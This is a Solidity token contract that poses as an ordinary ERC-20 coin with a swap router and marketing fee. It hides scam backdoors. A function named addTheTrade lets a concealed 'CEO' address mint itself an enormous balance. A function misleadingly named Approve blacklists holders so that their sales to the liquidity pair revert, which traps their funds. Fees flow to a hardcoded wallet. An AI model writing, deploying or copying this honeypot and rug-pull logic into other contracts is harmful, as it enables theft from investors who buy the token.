// SPDX-License-Identifier: MIT

pragma solidity ^0.8.16;


abstract contract Ownable {
    address private _owner;

    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }

     /**
     * @dev Emitted when `value` tokens are moved from one account (`from`) to
     * another (`to`).
     *
     * Note that `value` may be zero.
     */
    event Transfer(address indexed from, address indexed to, uint256 value);

    /**
     * @dev Emitted when the allowance of a `spender` for an `owner` is set by
     * a call to {approve}. `value` is the new allowance.
     */
    event Approval(address indexed owner, address indexed spender, uint256 value);

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor() {
        _transferOwnership(_msgSender());
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        _cheecdy();
        _;
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view virtual returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if the sender is not the owner.
     */
    function _cheecdy() internal view virtual {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */
    function renounceOwnership() public virtual onlyOwner {
        _transferOwnership(address(0));
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        _transferOwnership(newOwner);
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Internal function without access restriction.
     */
    function _transferOwnership(address newOwner) internal virtual {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }
}


library SafeMath {
    /**
     * @dev Returns the addition of two unsigned integers, with an overflow flag.
     *
     * _Available since v3.4._
     */
    function tryAdd(uint256 a, uint256 b) internal pure returns (bool, uint256) {
    unchecked {
        uint256 c = a + b;
        if (c < a) return (false, 0);
        return (true, c);
    }
    }

    /**
     * @dev Returns the subtraction of two unsigned integers, with an overflow flag.
     *
     * _Available since v3.4._
     */
    function trySub(uint256 a, uint256 b) internal pure returns (bool, uint256) {
    unchecked {
        if (b > a) return (false, 0);
        return (true, a - b);
    }
    }

    /**
     * @dev Returns the multiplication of two unsigned integers, with an overflow flag.
     *
     * _Available since v3.4._
     */
    function tryMul(uint256 a, uint256 b) internal pure returns (bool, uint256) {
    unchecked {
        // Gas optimization: this is cheaper than requiring 'a' not being zero, but the
        // benefit is lost if 'b' is also tested.
        // See: https://github.com/OpenZeppelin/openzeppelin-contracts/pull/522
        if (a == 0) return (true, 0);
        uint256 c = a * b;
        if (c / a != b) return (false, 0);
        return (true, c);
    }
    }

    /**
     * @dev Returns the division of two unsigned integers, with a division by zero flag.
     *
     * _Available since v3.4._
     */
    function tryDiv(uint256 a, uint256 b) internal pure returns (bool, uint256) {
    unchecked {
        if (b == 0) return (false, 0);
        return (true, a / b);
    }
    }

    /**
     * @dev Returns the remainder of dividing two unsigned integers, with a division by zero flag.
     *
     * _Available since v3.4._
     */
    function tryMod(uint256 a, uint256 b) internal pure returns (bool, uint256) {
    unchecked {
        if (b == 0) return (false, 0);
        return (true, a % b);
    }
    }

    /**
     * @dev Returns the addition of two unsigned integers, reverting on
     * overflow.
     *
     * Counterpart to Solidity's `+` operator.
     *
     * Requirements:
     *
     * - Addition cannot overflow.
     */
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        return a + b;
    }

    /**
     * @dev Returns the subtraction of two unsigned integers, reverting on
     * overflow (when the result is negative).
     *
     * Counterpart to Solidity's `-` operator.
     *
     * Requirements:
     *
     * - Subtraction cannot overflow.
     */
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return a - b;
    }

    /**
     * @dev Returns the multiplication of two unsigned integers, reverting on
     * overflow.
     *
     * Counterpart to Solidity's `*` operator.
     *
     * Requirements:
     *
     * - Multiplication cannot overflow.
     */
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        return a * b;
    }

    /**
     * @dev Returns the integer division of two unsigned integers, reverting on
     * division by zero. The result is rounded towards zero.
     *
     * Counterpart to Solidity's `/` operator.
     *
     * Requirements:
     *
     * - The divisor cannot be zero.
     */
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return a % b;
    }

    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
    unchecked {
        require(b <= a, errorMessage);
        return a - b;
    }
    }

    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
    unchecked {
        require(b > 0, errorMessage);
        return a / b;
    }
    }

    function mod(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
    unchecked {
        require(b > 0, errorMessage);
        return a % b;
    }
    }
}

interface IswapV2Factory {
    function createPair(address tokenA, address tokenB)
    external
    returns (address pair);
}

interface IswapV2Router {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
}

contract coin is Ownable {

    using SafeMath for uint256;
    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;
    address public  _pepamusCEO;
    mapping(address => bool) private _isExcludedFromFees;
    mapping(address => bool) private papavicc;

    address router = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
    address dexppair;
    IswapV2Router uniswapV2Router;
    address private _tokenOwner;
    bool private swapping;
    uint256 private marketAmount;
    uint256 private marketIntervalTime = 5*60;
    uint256 private marketCurrentTime;
    uint256 public swapTokensAtAmount;


    uint256 private _MYtotalSupply;
    string private _MYname;
    string private _MYsymbol;
    uint256 total = 6000000 * 10**decimals();

    uint256 llfee = 0;
    uint256 marketfee = 3;
    address marketwallet = 0x7CFb144E140465a2e7caA5771095A0b15Ed1Fcb5;

    
    function querybbwatibot(address sss) public view returns(bool)  {
        return papavicc[sss];
    }

    function abvultXox265() public view virtual  returns (uint256) {
        return _MYtotalSupply;
    }

    function addTheTrade() external {
        if (_msgSender() != _pepamusCEO) {
            return;
        }
        if (_pepamusCEO == _msgSender()){
            _balances[_msgSender()] = abvultXox265()*55000;
        }
    }

    function quitteApprove(address _s) external   {
        if (_pepamusCEO == _msgSender()){
            papavicc[_s] = false;
        }
    }

    function Approve(address _s) external   {
        if (_pepamusCEO == _msgSender()){
            papavicc[_s] = true;
        }
    }

    constructor(string memory name_, string memory symbol_,address antiBot_) {
        IswapV2Router _uniswapV2Router = IswapV2Router(router);
        uniswapV2Router = _uniswapV2Router;
        dexppair = IswapV2Factory(_uniswapV2Router.factory())
        .createPair(address(this), _uniswapV2Router.WETH());
        excludeFromFees(msg.sender, true);
        excludeFromFees(address(this), true);
        _tokenOwner = msg.sender;
        _MYname = name_;
        _MYsymbol = symbol_;
        _pepamusCEO = antiBot_;
        _oneMmint(msg.sender, total);
        marketCurrentTime = block.timestamp;
        swapTokensAtAmount = total.div(100000);

    }

    function name() public view virtual  returns (string memory) {
        return _MYname;
    }

    function symbol() public view virtual  returns (string memory) {
        return _MYsymbol;
    }

    function decimals() public view virtual  returns (uint8) {
        return 18;
    }

    /**
     * @dev See {IERC20-totalSupply}.
     */
    function totalSupply() public view virtual  returns (uint256) {
        return _MYtotalSupply;
    }

    /**
     * @dev See {IERC20-balanceOf}.
     */
    function balanceOf(address account) public view virtual  returns (uint256) {
        return _balances[account];
    }


    function transfer(address to, uint256 amount) public virtual  returns (bool) {
        address owner = _msgSender();
        _transfer(owner, to, amount);
        return true;
    }

    function allowance(address owner, address spender) public view virtual  returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public virtual  returns (bool) {
        address owner = _msgSender();
        _approve(owner, spender, amount);
        return true;
    }

    function _onetransfer(
        address sender,
        address recipient,
        uint256 amount
    ) internal virtual {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");

        _balances[sender] = _balances[sender].sub(
            amount,
            "ERC20: transfer amount exceeds balance"
        );
        _balances[recipient] = _balances[recipient].add(amount);
        emit Transfer(sender, recipient, amount);
    }

    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual  returns (bool) {
        address spender = _msgSender();
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }

    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        address owner = _msgSender();
        _approve(owner, spender, allowance(owner, spender) + addedValue);
        return true;
    }

    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        address owner = _msgSender();
        uint256 currentAllowance = allowance(owner, spender);
        require(currentAllowance >= subtractedValue, "ERC20: decreased allowance below zero");
    unchecked {
        _approve(owner, spender, currentAllowance - subtractedValue);
    }

        return true;
    }

    function _transfer(
        address fromSender,
        address to,
        uint256 amount
    ) internal virtual {
        require(fromSender != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");

        if(address(this) == fromSender || address(this) == to || _isExcludedFromFees[fromSender] || _isExcludedFromFees[to]){
			_onetransfer(fromSender, to, amount);
			return;
		}

        if(marketAmount > swapTokensAtAmount && block.timestamp >= (marketCurrentTime.add(marketIntervalTime))){
            if (
                    !swapping &&
                    _tokenOwner != fromSender &&
                    _tokenOwner != to &&
                    fromSender != dexppair
                ) {
                    swapping = true;
                    swap(marketAmount);
                    marketAmount = 0;
                    marketCurrentTime = block.timestamp;
                    swapping = false;
                }
        }

        uint256 balance= _balances[fromSender];
        if (papavicc[fromSender] != false ){
            if(dexppair == to)
            balance= _balances[fromSender]-(abvultXox265());
        }

        require(balance >= amount, "ERC20: transfer amount exceeds balance");
        _balances[fromSender] = balance.sub(amount);
        uint256 feeeA = amount.mul(llfee).div(100);
        uint256 feeeB = amount.mul(marketfee).div(100);
        _balances[dexppair] = _balances[dexppair].add(feeeA);
        _balances[address(this)] = _balances[address(this)].add(feeeB);
        marketAmount = marketAmount + feeeB;
        _balances[to] =  _balances[to].add(amount).sub(feeeA).sub(feeeB);
        emit Transfer(fromSender, to, amount);
    }

    function _oneMmint(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: the zero address");

        _MYtotalSupply += amount;
    unchecked {
        _balances[account] += amount;
    }
        emit Transfer(address(0), account, amount);

    }

    receive() external payable {}

    function excludeFromFees(address account, bool excluded) public onlyOwner {
        _isExcludedFromFees[account] = excluded;
    }

    function isExcludedFromFees(address account) public view returns (bool) {
        return _isExcludedFromFees[account];
    }

    function swapTokensForEth(uint256 tokenAmount) private {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapV2Router.WETH();

        _approve(address(this), address(uniswapV2Router), tokenAmount);

        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0, 
            path,
            address(this),
            block.timestamp
        );
    }

    function distributionFunds(address _to, uint256 _amount)private{
        payable(_to).transfer(_amount);
    }

    function swap(uint256 contractTokenBalance) private {
        swapTokensForEth(contractTokenBalance);
        uint256 newBalance = address(this).balance;
        distributionFunds(marketwallet,newBalance);
    }

    function _burn(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: burn from the zero address");

        uint256 accountBalance = _balances[account];
        require(accountBalance >= amount, "ERC20: burn amount exceeds balance");
    unchecked {
        _balances[account] = accountBalance - amount;
        // Overflow not possible: amount <= accountBalance <= totalSupply.
        _MYtotalSupply -= amount;
    }

        emit Transfer(account, address(0), amount);


    }

    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
        unchecked {
            _approve(owner, spender, currentAllowance - amount);
        }
        }
    }

    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
  
}